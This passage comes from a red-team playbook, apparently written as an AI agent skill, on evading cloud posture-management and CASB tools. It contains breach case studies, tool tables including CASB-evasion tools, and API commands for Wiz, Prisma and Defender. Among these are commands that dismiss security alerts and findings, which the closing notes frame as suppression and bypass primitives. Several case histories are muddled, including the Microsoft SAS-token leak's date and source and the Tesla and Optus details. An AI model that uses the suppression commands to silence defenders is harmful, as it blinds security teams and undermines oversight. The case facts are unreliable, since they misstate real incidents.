**Incident**: Tesla's Kubernetes console had no authentication. Attackers gained pod access, stole AWS credentials from the pod environment (the `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` env vars of a cloud SDK), and used them to access Tesla's S3 buckets. The buckets were used for crypto-mining data exfil.

**CSPM context**: Tesla reportedly had no CSPM at the time of the breach. Even if they had, the K8s console exposure would have been outside most CSPMs' scope (they cover cloud, not K8s control plane).

**Bypass primitive**: Cross-surface blind spot. Cloud CSPMs don't model K8s control plane; K8s CSPMs (Kubescape) didn't exist yet.

**Detection lesson**: CNAPP (which fuses cloud + K8s posture) closes this gap. Kubescape's NSA framework now flags anonymous K8s API access as a critical control.

```bash
kubescape scan framework nsa --control C-0053
```

### Case 3: Microsoft SAS token leak (2020) -- Wiz research

**Incident**: Wiz disclosed that Microsoft's Bing search app exposed an Azure Storage SAS (Shared Access Signature) token. The token granted read/write access to a blob containing mobile app user data for millions of users.

**CSPM context**: Microsoft Defender for Cloud had SAS token scanning capabilities, but the storage account in question was not in scope of the customer's Defender deployment (it was an internal Microsoft account).

**Bypass primitive**: No CSPM covered the affected storage account -- classic coverage gap.

**Detection lesson**: SAS tokens with broad permissions (`acdrw`) and long expiry (years) are a CSPM blind spot. Modern detection: Defender for Cloud's "Sensitive data discovery" + "Storage scan" flags long-lived SAS tokens.

```bash
# Detection: Azure Monitor alert on SAS token creation with broad permissions
az monitor activity-log list --resource-group REPLACE_WITH_YOUR_RG \
  --query "[?operationName.value=='Microsoft.Storage/storageAccounts/blobServices/generateUserDelegationKey']"
```

### Case 4: Optus (2022) -- CSPM scope gap

**Incident**: Optus (Australian telco) exposed an unauthenticated API that returned PII (driver's license numbers, passport numbers, email addresses) for 10M customers. The attacker was an internal actor (or had access to internal API documentation).

**CSPM context**: Optus had CSPM tooling in place, but:
- (a) The API was behind an API Gateway, which the CSPM treated as "managed" and didn't flag as public.
- (b) The API's authentication was misconfigured (permissive -- allowed unauthenticated access).
- (c) The CSPM didn't model the API Gateway -> Lambda -> DB data flow.

**Bypass primitive**: CNAPP graph coverage gap. The data flow (API Gateway -> Lambda -> DB) wasn't modelled, so the CSPM didn't flag the unauthenticated API as a sensitive-data exposure.

**Detection lesson**: A CNAPP that models API Gateway + Lambda data flows would have flagged this. Modern detection: AWS WAF + API Gateway authN enforcement + AWS Config rule for API Gateway authN.

```bash
aws apigateway get-rest-apis --region us-east-1 | jq '.items[] | {id, name}'
aws apigateway get-authorizers --rest-api-id REPLACE_WITH_YOUR_API_ID
```

### Case 5: ICBC ransomware (2023) -- CSPM alerting failure

**Incident**: ICBC Financial Services (the US Treasury arm of Industrial and Commercial Bank of China) was hit by LockBit 3.0 ransomware in November 2023. The attack exploited CVE-2023-4966 (Citrix Bleed) on an unpatched Citrix NetScaler.

**CSPM context**: ICBC's cloud CSPM reportedly didn't alert on the unpatched Citrix server because the server was on-prem and outside the CSPM's cloud scope.

**Bypass primitive**: Cloud-only CSPM scope. The Citrix server was on-prem; the CSPM only watched cloud resources.

**Detection lesson**: Extend posture management to on-prem via a CNAPP agent (Prisma Cloud Compute Defender, Wiz runtime sensor, Lacework agent). For Citrix specifically, scan CVE-2023-4966 directly via nuclei templates.

```bash
nuclei -u https://citrix.example.com -t http/cves/2023/CVE-2023-4966.yaml
```

---

## 12. Tooling Quick-Reference

### CSPM target enumeration

| Tool | Purpose | Install |
|------|---------|---------|
| prowler | AWS/Azure/GCP posture | `pip install prowler` |
| scoutsuite | Multi-cloud posture audit | `pip install scoutsuite` |
| cloudfox | "I know what permissions you have" | `go install github.com/BishopFox/cloudfox@latest` |

### IaC / Policy-as-code

| Tool | Purpose | Install |
|------|---------|---------|
| checkov | IaC scanner (TF/CFN/K8s/ARM) | `pip install checkov` |
| kics | IaC scanner (TF/CFN/K8s/Ansible/Helm) | `brew install kics` or download |
| terrascan | IaC scanner with OPA/Rego | `brew install terrascan` |
| snyk iac | Snyk IaC scanner | `npm install -g snyk` |
| kubescape | K8s posture + policy | `curl -s https://raw.githubusercontent.com/kubescape/kubescape/master/install.sh \| /bin/bash` |
| opa | Rego policy engine | `brew install opa` |
| kyverno | K8s-native policy | `kubectl create -f https://raw.githubusercontent.com/kyverno/kyverno/main/config/install.yaml` |

### CASB / SaaS evasion

| Tool | Purpose | Install |
|------|---------|---------|
| mitmproxy | TLS-intercepting proxy | `pip install mitmproxy` |
| burpsuite | Manual CASB proxy evasion | download |
| jwt_tool | JWT analysis / alg-confusion | `git clone https://github.com/ticarpi/jwt_tool` |
| frida | SSL pinning bypass | `pip install frida-tools` |

### Recon & state discovery

| Tool | Purpose | Install |
|------|---------|---------|
| cloudlist | Multi-cloud asset enum | `go install github.com/projectdiscovery/cloudlist@latest` |
| trufflehog | Secret scanner | `brew install trufflehog` |
| gh | GitHub API / OAuth audit | `brew install gh` |

### Defensive audit

| Tool | Purpose | Install |
|------|---------|---------|
| awscli | AWS API operations | `brew install awscli` |
| azure-cli | Azure API operations | `brew install azure-cli` |
| gcloud | GCP API operations | download |

---

## Appendix A: Wiz GraphQL API Quick-Reference

### Authentication

```bash
# Wiz service account JWT (issued from the Wiz portal)
echo "$WIZ_JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq '.'
# Decoded: { "aud": "wiz-api", "typ": "JWT", "iss": "wiz-auth", ... }
```

### Common queries

```bash
# List all assets of a specific type
curl -s "$WIZ_ENDPOINT/graphql" \
  -H "Authorization: Bearer $WIZ_JWT" \
  -H 'Content-Type: application/json' \
  --data '{"query":"query { assets(filter: {cloudNativeType: \"aws_ec2_instance\"}) { nodes { id name type cloudPlatform findings { title severity } } } }"}' \
  | jq

# List suppression rules (ignore rules)
curl -s "$WIZ_ENDPOINT/graphql" \
  -H "Authorization: Bearer $WIZ_JWT" \
  -H 'Content-Type: application/json' \
  --data '{"query":"query { ignoreRules { nodes { name description filters } } }"}' \
  | jq

# List graph schema entities
curl -s "$WIZ_ENDPOINT/graphql" \
  -H "Authorization: Bearer $WIZ_JWT" \
  -H 'Content-Type: application/json' \
  --data '{"query":"query { graphSchema { entities { name categories } } }"}' \
  | jq -r '.data.graphSchema.entities[].name' | sort

# Find an asset by cloud ID
curl -s "$WIZ_ENDPOINT/graphql" \
  -H "Authorization: Bearer $WIZ_JWT" \
  -H 'Content-Type: application/json' \
  --data '{"query":"query { assets(filter: {cloudProvider: AWS, cloudNativeType: \"aws_ec2_instance\", cloudAccountId: \"REPLACE_WITH_YOUR_ACCOUNT_ID\"}) { nodes { id name } } }"}' \
  | jq

# Query a specific finding
curl -s "$WIZ_ENDPOINT/graphql" \
  -H "Authorization: Bearer $WIZ_JWT" \
  -H 'Content-Type: application/json' \
  --data '{"query":"query { findings(id: \"REPLACE_WITH_YOUR_FINDING_ID\") { title severity status } }"}' \
  | jq
```

## Appendix B: Prisma Cloud API Quick-Reference

```bash
# Authenticate
PRISMA_JWT=$(curl -s -X POST "$PRISMA_API_ENDPOINT/login" \
  -H 'Content-Type: application/json' \
  --data '{"username":"REPLACE_WITH_YOUR_PRISMA_USER","password":"REPLACE_WITH_YOUR_PRISMA_PASSWORD"}' \
  | jq -r '.token')

# List policies
curl -s "$PRISMA_API_ENDPOINT/policy" -H "x-redlock-auth: $PRISMA_JWT" | jq

# List alerts
curl -s "$PRISMA_API_ENDPOINT/alert?timeType=relative&timeAmount=7&timeUnit=day" \
  -H "x-redlock-auth: $PRISMA_JWT" | jq

# Dismiss an alert
curl -s -X POST "$PRISMA_API_ENDPOINT/alert/REPLACE_WITH_YOUR_ALERT_ID/dismiss" \
  -H "x-redlock-auth: $PRISMA_JWT" \
  -H 'Content-Type: application/json' \
  --data '{"status":"dismissed","reason":"false positive"}'

# RQL query
curl -s -X POST "$PRISMA_API_ENDPOINT/search/config" \
  -H "x-redlock-auth: $PRISMA_JWT" \
  -H 'Content-Type: application/json' \
  --data '{"withResourceIds":true,"timeRange":{"type":"relative","value":{"amount":"7","unit":"day"}},"query":"config from cloud.resource where cloud.type = '\''aws'\'' and api.state = '\''enabled'\''","limit":100}'
```

## Appendix C: Defender for Cloud Quick-Reference

```bash
# Pricing tiers
az security pricing show --name VirtualMachines
az security pricing show --name StorageAccounts
az security pricing show --name KubernetesService
az security pricing show --name SqlServers
az security pricing show --name Containers
az security pricing show --name KeyVaults

# Assessments (posture findings)
az security assessments list -o json | jq '.[] | {displayName, resourceType, code: .properties.status.code}'

# Dismiss an assessment
az security assessment create \
  --name REPLACE_WITH_YOUR_ASSESSMENT_ID \
  --status-code NotApplicable \
  --status-cause Dismissed \
  --status-description 'investigated'

# Secure score
az security secure-scores show --name 'ascScore' -o json | jq '.properties'
```

---

## Closing Notes

This playbook is a starting point, not a recipe. Real engagements surface combinations and edge cases the playbook can't anticipate. The recurring themes:

1. **The CSPM is just an API consumer** -- it cannot detect what it cannot query. Every coverage gap is an attack-path opportunity.
2. **Suppression primitives are T1565** -- every BatchUpdateFindings, tag-based suppression, automation rule, and exception is a defender-inhibited-response-system instance. The audit trail is the defender's signal.
3. **Cross-cloud hops evade per-provider CSPMs** -- a CNAPP that fuses providers in one graph closes this gap; per-provider deployments miss it.
4. **CASB brokers are evadable** -- direct-to-origin API calls, BYO-CERT pinning, JWT/session replay, OAuth grant abuse are all viable bypasses. The SaaS provider's audit log is the detection signal.
5. **IaC state files are an out-of-band attack surface** -- secret extraction and drift injection are powerful primitives. Encrypted state backends + tight CI identity scoping + drift detection are the defensive counter.

For the canonical attack command catalogue, see `skills/cspm-casb-attack/payloads.md`. For the structured test cases (TC-CP-001..014), see `skills/cspm-casb-attack/test-cases.md`. For the skill definition, see `skills/cspm-casb-attack/SKILL.md`.
